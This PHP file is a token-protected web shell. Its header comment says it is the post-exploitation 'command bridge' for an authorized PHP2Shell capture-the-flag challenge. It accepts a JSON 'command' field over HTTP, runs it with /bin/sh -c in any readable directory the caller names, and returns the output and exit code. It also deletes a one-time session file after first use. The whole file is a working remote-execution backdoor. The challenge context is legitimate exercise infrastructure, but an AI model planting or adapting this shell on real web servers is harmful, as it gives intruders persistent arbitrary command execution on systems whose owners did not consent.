<?php
declare(strict_types=1);

/**
 * Token-protected command bridge for the authorized PHP2Shell challenge.
 *
 * The template is stored outside the webroot. Exploitation executes /s, which
 * materializes this file with a random token and exposes a per-session URL.
 */

header('Content-Type: application/json; charset=utf-8');
header('X-Content-Type-Options: nosniff');
header('Cache-Control: no-store');

const P2S_TOKEN = '__P2S_TOKEN__';

function respond(int $status, array $body): never
{
    http_response_code($status);
    echo json_encode($body, JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE);
    exit;
}

if (!hash_equals(P2S_TOKEN, (string) ($_SERVER['HTTP_X_P2S_TOKEN'] ?? ''))) {
    respond(403, ['error' => 'invalid shell token']);
}

// Remove the one-time session descriptor after the first authenticated use.
if (is_file('/var/www/html/proof/p')) {
    @unlink('/var/www/html/proof/p');
}

$raw = file_get_contents('php://input');
$request = json_decode($raw === false ? '' : $raw, true);
if (!is_array($request) || !isset($request['command']) || !is_string($request['command'])) {
    respond(400, ['error' => 'JSON body with command string required']);
}

$command = $request['command'];
$requestedCwd = $request['cwd'] ?? '/';
if (!is_string($requestedCwd) || !is_dir($requestedCwd) || !is_readable($requestedCwd)) {
    respond(400, ['error' => 'invalid cwd', 'cwd' => $requestedCwd]);
}
if (strlen($command) === 0 || strlen($command) > 65536) {
    respond(400, ['error' => 'command length must be 1..65536']);
}

$pipes = [];
$process = proc_open(
    ['/bin/sh', '-c', $command],
    [0 => ['pipe', 'r'], 1 => ['pipe', 'w'], 2 => ['pipe', 'w']],
    $pipes,
    $requestedCwd
);
if (!is_resource($process)) {
    respond(500, ['error' => 'proc_open failed']);
}

fwrite($pipes[0], $command);
fclose($pipes[0]);
$stdout = stream_get_contents($pipes[1]);
$stderr = stream_get_contents($pipes[2]);
fclose($pipes[1]);
fclose($pipes[2]);
$exitCode = proc_close($process);

respond(200, [
    'stdout' => $stdout === false ? '' : $stdout,
    'stderr' => $stderr === false ? '' : $stderr,
    'exit_code' => $exitCode,
    'cwd' => $requestedCwd,
]);
